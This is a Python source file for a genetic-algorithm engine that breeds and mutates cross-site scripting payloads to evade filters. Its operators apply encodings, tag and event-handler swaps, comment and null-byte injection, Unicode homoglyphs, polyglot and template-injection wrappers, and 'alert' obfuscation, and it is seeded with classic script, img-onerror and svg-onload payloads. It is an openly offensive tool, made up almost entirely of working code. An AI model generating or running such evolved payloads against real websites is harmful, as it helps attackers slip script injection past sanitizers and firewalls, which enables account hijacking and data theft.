"""
Genetic Algorithm-Based Payload Evolution Engine
Breeds successful payloads to create superior variants
"""

import random
import numpy as np
from typing import List, Dict, Tuple
from dataclasses import dataclass
import hashlib
import re

@dataclass
class PayloadGene:
    """Represents a payload with fitness score"""
    payload: str
    fitness: float = 0.0
    generation: int = 0
    parent_hash: str = None
    mutations: List[str] = None
    
    def __post_init__(self):
        self.hash = hashlib.md5(self.payload.encode()).hexdigest()
        if self.mutations is None:
            self.mutations = []

class GeneticPayloadMutator:
    """
    Evolves XSS payloads using genetic algorithms
    - Selection: Choose best performers
    - Crossover: Combine successful payloads
    - Mutation: Random variations
    - Fitness: Success rate + bypass rate
    """
    
    def __init__(self, population_size=50, mutation_rate=0.3, crossover_rate=0.7):
        self.population_size = population_size
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self.generation = 0
        self.elite_size = int(population_size * 0.1)  # Top 10% survive
        
        # Mutation operators (inspired by fuzzing techniques)
        self.mutation_operators = [
            self._case_mutation,
            self._encoding_mutation,
            self._tag_mutation,
            self._event_handler_mutation,
            self._comment_injection,
            self._null_byte_injection,
            self._unicode_mutation,
            self._polyglot_mutation,
            self._context_break_mutation,
            self._obfuscation_mutation
        ]
        
        # Crossover strategies
        self.crossover_strategies = [
            self._single_point_crossover,
            self._two_point_crossover,
            self._uniform_crossover,
            self._semantic_crossover
        ]
    
    def evolve_population(self, initial_payloads: List[str], 
                         fitness_func, 
                         generations=10) -> List[PayloadGene]:
        """
        Main evolution loop
        
        Args:
            initial_payloads: Seed payloads to start evolution
            fitness_func: Function that evaluates payload (returns 0-1)
            generations: Number of evolution cycles
        
        Returns:
            List of evolved PayloadGenes sorted by fitness
        """
        print(f"[GENETIC] Starting Genetic Evolution - Gen 0")
        
        # Initialize population
        population = [PayloadGene(p, generation=0) for p in initial_payloads]
        
        # Expand population to desired size with mutations
        while len(population) < self.population_size:
            parent = random.choice(population)
            mutated = self._mutate(parent)
            population.append(mutated)
        
        # Evaluate initial fitness
        population = self._evaluate_fitness(population, fitness_func)
        
        # Evolution loop
        for gen in range(1, generations + 1):
            self.generation = gen
            print(f"[GENETIC] Generation {gen}/{generations}")
            
            # Selection: Keep elite performers
            population = sorted(population, key=lambda x: x.fitness, reverse=True)
            elite = population[:self.elite_size]
            
            # Generate new offspring
            offspring = []
            while len(offspring) < self.population_size - self.elite_size:
                # Select parents using tournament selection
                parent1 = self._tournament_selection(population)
                parent2 = self._tournament_selection(population)
                
                # Crossover
                if random.random() < self.crossover_rate:
                    child1, child2 = self._crossover(parent1, parent2)
                else:
                    child1, child2 = parent1, parent2
                
                # Mutation
                if random.random() < self.mutation_rate:
                    child1 = self._mutate(child1)
                if random.random() < self.mutation_rate:
                    child2 = self._mutate(child2)
                
                offspring.extend([child1, child2])
            
            # Combine elite + offspring
            population = elite + offspring[:self.population_size - self.elite_size]
            
            # Evaluate fitness
            population = self._evaluate_fitness(population, fitness_func)
            
            # Log best performer
            best = max(population, key=lambda x: x.fitness)
            print(f"   Best fitness: {best.fitness:.3f} | Payload: {best.payload[:50]}...")
        
        # Return final population sorted by fitness
        return sorted(population, key=lambda x: x.fitness, reverse=True)
    
    def _evaluate_fitness(self, population: List[PayloadGene], fitness_func) -> List[PayloadGene]:
        """Evaluate fitness for each payload"""
        for gene in population:
            if gene.fitness == 0.0:  # Only evaluate if not already scored
                try:
                    gene.fitness = fitness_func(gene.payload)
                except Exception as e:
                    gene.fitness = 0.0
        return population
    
    def _tournament_selection(self, population: List[PayloadGene], 
                              tournament_size=3) -> PayloadGene:
        """Select parent using tournament selection"""
        tournament = random.sample(population, min(tournament_size, len(population)))
        return max(tournament, key=lambda x: x.fitness)
    
    def _crossover(self, parent1: PayloadGene, parent2: PayloadGene) -> Tuple[PayloadGene, PayloadGene]:
        """Perform crossover between two parents"""
        strategy = random.choice(self.crossover_strategies)
        child1_payload, child2_payload = strategy(parent1.payload, parent2.payload)
        
        child1 = PayloadGene(
            payload=child1_payload,
            generation=self.generation,
            parent_hash=parent1.hash,
            mutations=['crossover']
        )
        child2 = PayloadGene(
            payload=child2_payload,
            generation=self.generation,
            parent_hash=parent2.hash,
            mutations=['crossover']
        )
        
        return child1, child2
    
    def _mutate(self, gene: PayloadGene) -> PayloadGene:
        """Apply random mutation operator"""
        operator = random.choice(self.mutation_operators)
        mutated_payload = operator(gene.payload)
        
        return PayloadGene(
            payload=mutated_payload,
            generation=self.generation,
            parent_hash=gene.hash,
            mutations=gene.mutations + [operator.__name__]
        )
    
    # ==================== CROSSOVER STRATEGIES ====================
    
    def _single_point_crossover(self, p1: str, p2: str) -> Tuple[str, str]:
        """Split at one point and swap"""
        if len(p1) < 2 or len(p2) < 2:
            return p1, p2
        
        point = random.randint(1, min(len(p1), len(p2)) - 1)
        child1 = p1[:point] + p2[point:]
        child2 = p2[:point] + p1[point:]
        return child1, child2
    
    def _two_point_crossover(self, p1: str, p2: str) -> Tuple[str, str]:
        """Split at two points and swap middle"""
        if len(p1) < 3 or len(p2) < 3:
            return p1, p2
        
        min_len = min(len(p1), len(p2))
        point1 = random.randint(1, min_len - 2)
        point2 = random.randint(point1 + 1, min_len - 1)
        
        child1 = p1[:point1] + p2[point1:point2] + p1[point2:]
        child2 = p2[:point1] + p1[point1:point2] + p2[point2:]
        return child1, child2
    
    def _uniform_crossover(self, p1: str, p2: str) -> Tuple[str, str]:
        """Randomly choose each character from either parent"""
        min_len = min(len(p1), len(p2))
        child1 = ''.join(random.choice([p1[i], p2[i]]) for i in range(min_len))
        child2 = ''.join(random.choice([p2[i], p1[i]]) for i in range(min_len))
        
        # Append remaining characters
        if len(p1) > min_len:
            child1 += p1[min_len:]
        if len(p2) > min_len:
            child2 += p2[min_len:]
        
        return child1, child2
    
    def _semantic_crossover(self, p1: str, p2: str) -> Tuple[str, str]:
        """Combine semantic components (tags, event handlers)"""
        # Extract components
        tags1 = self._extract_tags(p1)
        tags2 = self._extract_tags(p2)
        events1 = self._extract_event_handlers(p1)
        events2 = self._extract_event_handlers(p2)
        
        # Mix components
        all_tags = tags1 + tags2
        all_events = events1 + events2
        
        mixed_tags1 = random.sample(all_tags, k=min(len(all_tags), 2)) if all_tags else []
        mixed_tags2 = random.sample(all_tags, k=min(len(all_tags), 2)) if all_tags else []
        mixed_events1 = random.sample(all_events, k=min(len(all_events), 1)) if all_events else []
        mixed_events2 = random.sample(all_events, k=min(len(all_events), 1)) if all_events else []
        
        # Reconstruct payloads
        child1 = self._reconstruct_payload(mixed_tags1, mixed_events1)
        child2 = self._reconstruct_payload(mixed_tags2, mixed_events2)
        
        return child1, child2
    
    # ==================== MUTATION OPERATORS ====================
    
    def _case_mutation(self, payload: str) -> str:
        """Randomly change case of characters"""
        mutated = list(payload)
        for i in range(len(mutated)):
            if random.random() < 0.3 and mutated[i].isalpha():
                mutated[i] = mutated[i].swapcase()
        return ''.join(mutated)
    
    def _encoding_mutation(self, payload: str) -> str:
        """Apply various encoding schemes"""
        encodings = [
            lambda s: ''.join(f'%{ord(c):02x}' for c in s),  # URL encode
            lambda s: ''.join(f'&#{ord(c)};' for c in s),    # HTML encode
            lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),  # Unicode
            lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),  # Hex
        ]
        
        encoding = random.choice(encodings)
        # Encode random substring
        if len(payload) > 4:
            start = random.randint(0, len(payload) - 3)
            end = random.randint(start + 1, len(payload))
            return payload[:start] + encoding(payload[start:end]) + payload[end:]
        return encoding(payload)
    
    def _tag_mutation(self, payload: str) -> str:
        """Mutate HTML tags"""
        tag_replacements = {
            'script': ['svg', 'iframe', 'object', 'embed', 'math'],
            'img': ['svg', 'video', 'audio', 'image'],
            'body': ['html', 'div', 'form', 'marquee'],
        }
        
        payload_lower = payload.lower()
        for old_tag, new_tags in tag_replacements.items():
            if old_tag in payload_lower:
                new_tag = random.choice(new_tags)
                payload = payload.replace(old_tag, new_tag)
                payload = payload.replace(old_tag.upper(), new_tag.upper())
                break
        
        return payload
    
    def _event_handler_mutation(self, payload: str) -> str:
        """Mutate event handlers"""
        events = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 
                  'oninput', 'ontoggle', 'onstart', 'onbegin', 'onanimationstart',
                  'onpointerenter', 'onwheel', 'onauxclick', 'oncut', 'onpaste']
        
        payload_lower = payload.lower()
        # Find existing event handler
        for event in events:
            if event in payload_lower:
                new_event = random.choice(events)
                payload = payload.replace(event, new_event)
                break
        else:
            # Add new event handler
            if '>' in payload:
                insertion_point = payload.index('>')
                new_event = random.choice(events)
                payload = payload[:insertion_point] + f' {new_event}=alert(1)' + payload[insertion_point:]
        
        return payload
    
    def _comment_injection(self, payload: str) -> str:
        """Inject HTML comments to bypass filters"""
        comments = ['<!--XSS-->', '<!-->', '<!--', '-->', '/**/']
        comment = random.choice(comments)
        
        # Insert at random position
        if len(payload) > 2:
            pos = random.randint(1, len(payload) - 1)
            return payload[:pos] + comment + payload[pos:]
        return comment + payload
    
    def _null_byte_injection(self, payload: str) -> str:
        """Inject null bytes and special characters"""
        special_chars = ['\x00', '\x0a', '\x0d', '\x09', '\x0b', '\x0c']
        char = random.choice(special_chars)
        
        if len(payload) > 2:
            pos = random.randint(1, len(payload) - 1)
            return payload[:pos] + char + payload[pos:]
        return char + payload
    
    def _unicode_mutation(self, payload: str) -> str:
        """Use Unicode variations"""
        # Homoglyphs and variations
        replacements = {
            'a': ['а', 'ɑ', 'α'],  # Cyrillic, Latin, Greek
            'o': ['о', 'ο', '০'],
            'e': ['е', 'ė', 'ε'],
            'i': ['і', 'ɪ', 'ι'],
            '<': ['‹', '〈', '＜'],
            '>': ['›', '〉', '＞'],
        }
        
        mutated = list(payload)
        for i, char in enumerate(mutated):
            if char in replacements and random.random() < 0.2:
                mutated[i] = random.choice(replacements[char])
        
        return ''.join(mutated)
    
    def _polyglot_mutation(self, payload: str) -> str:
        """Create polyglot payloads (work in multiple contexts)"""
        # Escape quotes for template
        safe_payload = payload.replace('"', '\\"')
        polyglot_templates = [
            f'{{{{constructor.constructor("{safe_payload}")()}}}}',
            f'"><script>{payload}</script><"',
            f"'><svg onload={payload}>",
            f'javascript:{payload}/*',
        ]
        return random.choice(polyglot_templates)
    
    def _context_break_mutation(self, payload: str) -> str:
        """Add context-breaking characters"""
        break_chars = ['"', "'", '>', '<', '`', '{', '}', ')', '(']
        break_char = random.choice(break_chars)
        
        # Prepend context breaker
        return break_char + payload
    
    def _obfuscation_mutation(self, payload: str) -> str:
        """Apply JavaScript obfuscation techniques"""
        if 'alert' in payload:
            obfuscations = [
                payload.replace('alert', 'top["ale"+"rt"]'),
                payload.replace('alert', 'self["ale"+"rt"]'),
                payload.replace('alert', 'window["ale"+"rt"]'),
                payload.replace('alert', 'eval("ale"+"rt")'),
                payload.replace('alert', 'Function("ale"+"rt")()'),
            ]
            return random.choice(obfuscations)
        return payload
    
    # ==================== HELPER METHODS ====================
    
    def _extract_tags(self, payload: str) -> List[str]:
        """Extract HTML tags from payload"""
        return re.findall(r'<(\w+)', payload)
    
    def _extract_event_handlers(self, payload: str) -> List[str]:
        """Extract event handlers from payload"""
        return re.findall(r'(on\w+)=', payload, re.IGNORECASE)
    
    def _reconstruct_payload(self, tags: List[str], events: List[str]) -> str:
        """Reconstruct payload from components"""
        if not tags:
            tags = ['script']
        if not events:
            events = ['onload']
        
        tag = tags[0]
        event = events[0] if events else 'onload'
        
        return f'<{tag} {event}=alert(1)>'


# ==================== USAGE EXAMPLE ====================

if __name__ == "__main__":
    # Example fitness function (replace with real testing)
    def mock_fitness(payload: str) -> float:
        """Mock fitness: reward certain patterns"""
        score = 0.0
        if 'alert' in payload:
            score += 0.3
        if any(tag in payload for tag in ['svg', 'iframe', 'object']):
            score += 0.3
        if any(event in payload for event in ['ontoggle', 'onanimationstart']):
            score += 0.4
        return min(score, 1.0)
    
    # Initialize mutator
    mutator = GeneticPayloadMutator(population_size=20, mutation_rate=0.4)
    
    # Seed payloads
    seeds = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
    ]
    
    # Evolve!
    evolved = mutator.evolve_population(seeds, mock_fitness, generations=5)
    
    print("\n🏆 Top 5 Evolved Payloads:")
    for i, gene in enumerate(evolved[:5], 1):
        print(f"{i}. Fitness: {gene.fitness:.3f} | {gene.payload}")
